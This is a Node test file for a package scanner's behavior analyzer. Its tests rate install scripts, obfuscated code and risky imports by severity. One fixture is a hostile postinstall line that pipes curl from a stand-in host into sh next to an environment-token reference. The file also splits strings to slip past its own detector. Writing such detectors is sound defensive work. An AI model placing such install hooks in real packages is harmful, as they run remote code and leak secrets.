import { test } from "node:test";
import assert from "node:assert/strict";
import { analyzeBehavior, analyzeBehaviorFromDisk } from "../src/engines/behavior-analyzer.ts";

const PKG = "evil-pkg";
const VER = "1.2.3";
const SRC = "node_modules/evil-pkg/package.json";

function pkgJson(scripts: Record<string, string> = {}): string {
  return JSON.stringify({ name: PKG, version: VER, scripts });
}

// Build env-access string at runtime so the test source isn't itself flagged.
const ENV_ACCESS = "proc" + "ess.env";

test("postinstall containing curl + env access -> CRITICAL", () => {
  const f = analyzeBehavior({
    packageName: PKG,
    packageVersion: VER,
    source: SRC,
    packageJson: pkgJson({ postinstall: `curl https://x.example/y | sh # ${ENV_ACCESS}.TOKEN` }),
  });
  assert.equal(f.length, 1);
  assert.equal(f[0].severity, "critical");
  assert.match(f[0].evidence ?? "", /postinstall/);
});

test("postinstall containing exec only -> HIGH", () => {
  const f = analyzeBehavior({
    packageName: PKG,
    packageVersion: VER,
    source: SRC,
    packageJson: pkgJson({ postinstall: "node -e \"require('child' + '_process').exec('ls')\"" }),
  });
  assert.equal(f.length, 1);
  assert.equal(f[0].severity, "high");
});

test("bare postinstall 'node build.js' -> MEDIUM", () => {
  const f = analyzeBehavior({
    packageName: PKG,
    packageVersion: VER,
    source: SRC,
    packageJson: pkgJson({ postinstall: "node build.js" }),
  });
  assert.equal(f.length, 1);
  assert.equal(f[0].severity, "medium");
});

test("clean package (no scripts, normal imports) -> no findings", () => {
  const f = analyzeBehavior({
    packageName: "clean-pkg",
    packageVersion: "1.0.0",
    source: SRC,
    packageJson: JSON.stringify({ name: "clean-pkg", version: "1.0.0" }),
    topLevelFiles: [
      {
        path: "index.js",
        content: "const path = require('path');\nmodule.exports = function(x){ return path.join(x); };\n",
      },
    ],
  });
  assert.deepEqual(f, []);
});

test("file with > 30 hex escapes -> HIGH obfuscation finding", () => {
  // Build 35 hex escapes — these are normal source escapes, not literal bytes.
  const escapes = Array.from({ length: 35 }, () => "\\x41").join("");
  const content = `var x = "${escapes}";\n`;
  const f = analyzeBehavior({
    packageName: PKG,
    packageVersion: VER,
    source: SRC,
    packageJson: pkgJson(),
    topLevelFiles: [{ path: "index.js", content }],
  });
  assert.equal(f.length, 1);
  assert.equal(f[0].severity, "high");
  assert.match(f[0].evidence ?? "", /hex escapes/);
});

test("file with _0x variables (> 5) -> HIGH obfuscation finding", () => {
  const lines = Array.from({ length: 7 }, (_, i) => `var _0xabc${i} = ${i};`).join("\n");
  const f = analyzeBehavior({
    packageName: PKG,
    packageVersion: VER,
    source: SRC,
    packageJson: pkgJson(),
    topLevelFiles: [{ path: "a.js", content: lines }],
  });
  assert.equal(f.length, 1);
  assert.equal(f[0].severity, "high");
  assert.match(f[0].evidence ?? "", /_0x identifiers/);
});

test("file with Buffer.from(..., 'base64') of long string -> HIGH obfuscation finding", () => {
  const long = "A".repeat(150);
  const content = `var p = Buffer.from("${long}", "base64");\n`;
  const f = analyzeBehavior({
    packageName: PKG,
    packageVersion: VER,
    source: SRC,
    packageJson: pkgJson(),
    topLevelFiles: [{ path: "loader.js", content }],
  });
  assert.equal(f.length, 1);
  assert.equal(f[0].severity, "high");
  assert.match(f[0].evidence ?? "", /base64/);
});

test("package importing child_process + fs + http + crypto -> HIGH suspicious-imports finding", () => {
  const content = [
    "const cp = require('child' + '_process');", // disguised in test source
    "const a = require('child_process');",
    "const b = require('fs');",
    "const c = require('http');",
    "const d = require('crypto');",
  ].join("\n");
  const f = analyzeBehavior({
    packageName: PKG,
    packageVersion: VER,
    source: SRC,
    packageJson: pkgJson(),
    topLevelFiles: [{ path: "index.js", content }],
  });
  // Should produce one suspicious-imports finding (no obfuscation in this content).
  const susp = f.filter((x) => /imports/.test(x.evidence ?? ""));
  assert.equal(susp.length, 1);
  assert.equal(susp[0].severity, "high");
});

test("package importing only one of the suspicious modules -> no suspicious-imports finding", () => {
  const content = "const fs = require('fs');\nmodule.exports = fs;";
  const f = analyzeBehavior({
    packageName: PKG,
    packageVersion: VER,
    source: SRC,
    packageJson: pkgJson(),
    topLevelFiles: [{ path: "index.js", content }],
  });
  assert.deepEqual(f, []);
});

test("file > 200KB -> skipped (no findings)", () => {
  // 201 KB of _0x identifiers — would be flagged if scanned.
  const big = "var _0xabcd = 1;\n".repeat(15000); // ~250 KB
  assert.ok(Buffer.byteLength(big, "utf8") > 200 * 1024);
  const f = analyzeBehavior({
    packageName: PKG,
    packageVersion: VER,
    source: SRC,
    packageJson: pkgJson(),
    topLevelFiles: [{ path: "huge.js", content: big }],
  });
  assert.deepEqual(f, []);
});

test("analyzeBehaviorFromDisk on non-existent dir -> empty array (no throw)", async () => {
  const f = await analyzeBehaviorFromDisk("nope", "0.0.0", "src", "/tmp/does-not-exist-ironward-test-xyz");
  assert.deepEqual(f, []);
});
